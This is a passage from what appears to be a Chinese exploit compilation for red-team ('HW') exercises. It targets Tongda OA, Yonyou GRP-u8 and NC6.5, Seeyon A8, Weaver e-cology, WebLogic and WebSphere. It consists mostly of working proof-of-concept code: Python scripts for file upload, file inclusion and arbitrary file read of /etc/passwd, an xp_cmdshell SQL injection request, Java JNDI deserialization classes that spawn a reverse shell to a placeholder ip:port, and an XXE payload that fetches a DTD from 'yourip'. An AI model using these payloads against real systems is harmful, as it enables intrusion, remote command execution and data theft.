class="comment"># 文件上传后路径</span></span><br><span class="line">        path = uploadRes.text</span><br><span class="line">        path = path[path.find(<span class="string">'@'</span>) + <span class="number">1</span>:path.rfind(<span class="string">'|'</span>)].replace(<span class="string">"_"</span>, <span class="string">"\/"</span>).replace(<span class="string">"|"</span>, <span class="string">"."</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># json形式包含url访问本地</span></span><br><span class="line">        includeData = &#123;<span class="string">"json"</span>: <span class="string">"&#123;\"url\":\"/general/../../attach/im/"</span> + path + <span class="string">"\"&#125;"</span>&#125;</span><br><span class="line">        includeRes = requests.post(includeUrl, data=includeData)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Tongda_Vul_test"</span> <span class="keyword">in</span> includeRes.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="5、用友GRP-u8-XXE-amp-SQL注入导致命令执行"><a href="#5、用友GRP-u8-XXE-amp-SQL注入导致命令执行" class="headerlink" title="5、用友GRP-u8 XXE&amp;SQL注入导致命令执行"></a>5、用友GRP-u8 XXE&amp;SQL注入导致命令执行</h4><p><strong>描述：</strong> 用友GRP-u8存在XXE漏洞，该漏洞源于应用程序解析XML输入时没有进制外部实体的加载，导致可加载恶意外部文件。</p><p><strong>利用条件：</strong>无需登录</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Proxy</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Accept</span>: Accept: */*</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/4.0 (compatible; MSIE 6.0;)</span><br><span class="line"><span class="attribute">Host</span>: host</span><br><span class="line"><span class="attribute">Content-Length</span>: 357</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"></span><br><span class="line">cVer=9.8.0&amp;dp=&lt;?xml version="1.0" encoding="GB2312"?&gt;&lt;R9PACKET version="1"&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format="text"&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format="text"&gt;exec xp_cmdshell 'net user'&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt;</span><br></pre></td></tr></table></figure><p><strong>参考：</strong><a href="https://www.cnblogs.com/yuzly/p/13675224.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/13675224.html</a></p><h4 id="6、用友NC6-5反序列化漏洞"><a href="#6、用友NC6-5反序列化漏洞" class="headerlink" title="6、用友NC6.5反序列化漏洞"></a>6、用友NC6.5反序列化漏洞</h4><figure class="highlight java"><figcaption><span>explpit.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nc.bs.framework.common.NCLocator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">attack</span><span class="params">(String url, String jndipath)</span> </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        <span class="keyword">if</span> (!url.startsWith(<span class="string">"http"</span>)) &#123;</span><br><span class="line">            url = <span class="string">"http://"</span> + url;</span><br><span class="line">        &#125;</span><br><span class="line">        env.put(<span class="string">"SERVICEDISPATCH_URL"</span>, url + <span class="string">"/ServiceDispatcherServlet"</span>);</span><br><span class="line">        NCLocator locator = NCLocator.getInstance(env);</span><br><span class="line">        locator.lookup(jndipath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        attack(<span class="string">"http://target"</span>, <span class="string">"ldap://ip:port/classname"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><figcaption><span>remote.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">remote</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">remote</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>,<span class="string">"-c"</span>,<span class="string">"sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用 nc 自带的类进行远程部署利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nc.bs.framework.common.ComponentMetaVO;</span><br><span class="line"><span class="keyword">import</span> nc.bs.framework.rmi.RemoteAddressSelector;</span><br><span class="line"><span class="keyword">import</span> nc.bs.framework.rmi.RemoteProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">remote</span> <span class="keyword">implements</span> <span class="title">RemoteProxy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">remote</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>,<span class="string">"-c"</span>,<span class="string">"sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getAttribute</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAttribute</span><span class="params">(String s, Object o)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ComponentMetaVO <span class="title">getComponentMetaVO</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRetryMax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRetryMax</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getRetryInterval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRetryInterval</span><span class="params">(<span class="keyword">long</span> l)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRemoteAddressSelector</span><span class="params">(RemoteAddressSelector remoteAddressSelector)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RemoteAddressSelector <span class="title">getRemoteAddressSelector</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.sari3l.com/posts/608d18f0/" target="_blank" rel="noopener">https://blog.sari3l.com/posts/608d18f0/</a> <a href="https://xz.aliyun.com/t/8242?page=5" target="_blank" rel="noopener">https://xz.aliyun.com/t/8242?page=5</a></p><h4 id="7、致远A8任意文件写入文件上传漏洞"><a href="#7、致远A8任意文件写入文件上传漏洞" class="headerlink" title="7、致远A8任意文件写入文件上传漏洞"></a>7、致远A8任意文件写入文件上传漏洞</h4><p>备注：去年HW老漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">POC = <span class="string">'DBSTEP V3.0     354             0               28             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT3brV6\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\nseeyon_A8_arbitrary_upload168f3e4c470b9d72920d3dff7bfa0a0e'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(self)</span>:</span></span><br><span class="line">    vulUrl = self.url + <span class="string">"/seeyon/htmlofficeservlet"</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rsp = requests.post(url=vulUrl, data=POC, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'BSTEP=OKMLlKlV'</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">            r = requests.get(self.url + <span class="string">'/seeyon/test123456.txt'</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                httpResponse = <span class="string">"HTTP Response Status:"</span> + str(r.status_code) \</span><br><span class="line">                               + <span class="string">"\nHTTP Response Headers:"</span> + str(r.headers) \</span><br><span class="line">                               + <span class="string">"\nHTTP Response Body:\n"</span> + str(r.text)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>, httpResponse</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="8、致远A8反序列化漏洞"><a href="#8、致远A8反序列化漏洞" class="headerlink" title="8、致远A8反序列化漏洞"></a>8、致远A8反序列化漏洞</h4><h4 id="9、泛微e-cology某版本存在RCE漏洞"><a href="#9、泛微e-cology某版本存在RCE漏洞" class="headerlink" title="9、泛微e-cology某版本存在RCE漏洞"></a>9、泛微e-cology某版本存在RCE漏洞</h4><p>备注：去年HW老漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">POC = <span class="string">'bsh.script=exec("ping");&amp;bsh.servlet.captureOutErr=true&amp; bsh.servlet.output=raw&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(self)</span>:</span></span><br><span class="line">    vulUrl = self.url + <span class="string">"/weaver/bsh.servlet.BshServle"</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rsp = requests.post(url=vulUrl, data=POC, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> rsp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"ping"</span> <span class="keyword">in</span> rsp.text <span class="keyword">and</span> <span class="string">"count"</span> <span class="keyword">in</span> rsp.text <span class="keyword">and</span> <span class="string">"timeout"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">                httpResponse = <span class="string">"HTTP Response Status:"</span> + str(rsp.status_code) \</span><br><span class="line">                               + <span class="string">"\nHTTP Response Headers:"</span> + str(rsp.headers) \</span><br><span class="line">                               + <span class="string">"\nHTTP Response Body:\n"</span> + str(rsp.text)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>, httpResponse</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="10、泛微云桥任意文件读取"><a href="#10、泛微云桥任意文件读取" class="headerlink" title="10、泛微云桥任意文件读取"></a>10、泛微云桥任意文件读取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(self)</span>:</span></span><br><span class="line">    vulUrl_win = self.url + <span class="string">"/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt"</span></span><br><span class="line">    vulUrl_linux = self.url + <span class="string">"/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt"</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)"</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rsp = requests.get(url=vulUrl_win, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> rsp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"id"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">                print(rsp.text)</span><br><span class="line">                match = re.finditer(<span class="string">r"\"id\":\"(?P&lt;var&gt;.+?)\""</span>, rsp.text)</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> match:</span><br><span class="line">                    fileId = m.group(<span class="string">'var'</span>)</span><br><span class="line">                filePath = self.url + <span class="string">"/file/fileNoLogin/"</span> + fileId</span><br><span class="line">                filersp = requests.get(url=filePath, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"root:x:0:0:root:/root:/bin/bash"</span> <span class="keyword">in</span> filersp.text:</span><br><span class="line">                    httpResponse = <span class="string">"HTTP Response Status:"</span> + str(filersp.status_code) \</span><br><span class="line">                                   + <span class="string">"\nHTTP Response Headers:"</span> + str(filersp.headers) \</span><br><span class="line">                                   + <span class="string">"\nHTTP Response Body:\n"</span> + str(filersp.text)</span><br><span class="line">                    print(httpResponse)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span>, httpResponse</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rsp = requests.get(url=vulUrl_linux, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"id"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">                print(rsp.text)</span><br><span class="line">                match = re.finditer(<span class="string">r"\"id\":\"(?P&lt;var&gt;.+?)\""</span>, rsp.text)</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> match:</span><br><span class="line">                    fileId = m.group(<span class="string">'var'</span>)</span><br><span class="line">                filePath = self.url + <span class="string">"/file/fileNoLogin/"</span> + fileId</span><br><span class="line">                filersp = requests.get(url=filePath, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"root:x"</span> <span class="keyword">in</span> filersp <span class="keyword">and</span> <span class="string">":0:0:root:/root:/bin/bash"</span> <span class="keyword">in</span> filersp.text:</span><br><span class="line">                    httpResponse = <span class="string">"HTTP Response Status:"</span> + str(filersp.status_code) \</span><br><span class="line">                                   + <span class="string">"\nHTTP Response Headers:"</span> + str(filersp.headers) \</span><br><span class="line">                                   + <span class="string">"\nHTTP Response Body:\n"</span> + str(filersp.text)</span><br><span class="line">                    print(httpResponse)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span>, httpResponse</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p><strong>参考：</strong>xray</p><h2 id="三、中间件-容器"><a href="#三、中间件-容器" class="headerlink" title="三、中间件/容器"></a>三、中间件/容器</h2><h4 id="1、Weblogic命令执行漏洞-CVE-2020-14645"><a href="#1、Weblogic命令执行漏洞-CVE-2020-14645" class="headerlink" title="1、Weblogic命令执行漏洞 CVE-2020-14645"></a>1、Weblogic命令执行漏洞 CVE-2020-14645</h4><p>参考：<a href="https://my.oschina.net/u/4582816/blog/4436485" target="_blank" rel="noopener">https://my.oschina.net/u/4582816/blog/4436485</a></p><h4 id="2、Weblogic反序列化漏洞-CVE-2020-2551"><a href="#2、Weblogic反序列化漏洞-CVE-2020-2551" class="headerlink" title="2、Weblogic反序列化漏洞 CVE-2020-2551"></a>2、Weblogic反序列化漏洞 CVE-2020-2551</h4><p>参考：<a href="https://xz.aliyun.com/t/7725" target="_blank" rel="noopener">https://xz.aliyun.com/t/7725</a></p><h4 id="3、Weblogic反序列化漏洞-CVE-2020-2555"><a href="#3、Weblogic反序列化漏洞-CVE-2020-2555" class="headerlink" title="3、Weblogic反序列化漏洞 CVE-2020-2555"></a>3、Weblogic反序列化漏洞 CVE-2020-2555</h4><p>参考：<a href="https://www.secpulse.com/archives/140207.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/140207.html</a></p><h4 id="4、WebSphere远程代码执行漏洞-CVE-2020-4450"><a href="#4、WebSphere远程代码执行漏洞-CVE-2020-4450" class="headerlink" title="4、WebSphere远程代码执行漏洞 CVE-2020-4450"></a>4、WebSphere远程代码执行漏洞 CVE-2020-4450</h4><p>参考：<a href="https://lucifaer.com/2020/08/21/WebSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-4450%EF%BC%89/" target="_blank" rel="noopener">https://lucifaer.com/2020/08/21/WebSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-4450%EF%BC%89/</a></p><h4 id="5、WebSphere远程代码执行漏洞-CVE-2020-4362"><a href="#5、WebSphere远程代码执行漏洞-CVE-2020-4362" class="headerlink" title="5、WebSphere远程代码执行漏洞 CVE-2020-4362"></a>5、WebSphere远程代码执行漏洞 CVE-2020-4362</h4><p>参考：<a href="https://xz.aliyun.com/t/8248?page=5" target="_blank" rel="noopener">https://xz.aliyun.com/t/8248?page=5</a></p><h4 id="6、WebSphere-存在XXE外部实体注入漏洞-CVE-2020-4643"><a href="#6、WebSphere-存在XXE外部实体注入漏洞-CVE-2020-4643" class="headerlink" title="6、WebSphere 存在XXE外部实体注入漏洞 CVE-2020-4643"></a>6、WebSphere 存在XXE外部实体注入漏洞 CVE-2020-4643</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">xml如下：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE x [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">aaa</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///C:/Windows/win.ini"</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">bbb</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://yourip:8000/xx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %bbb;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">definitions</span> <span class="attr">name</span>=<span class="string">"HelloService"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/"</span>&gt;</span></span><br><span class="line">  <span class="symbol">&amp;ddd;</span></span><br><span class="line"><span 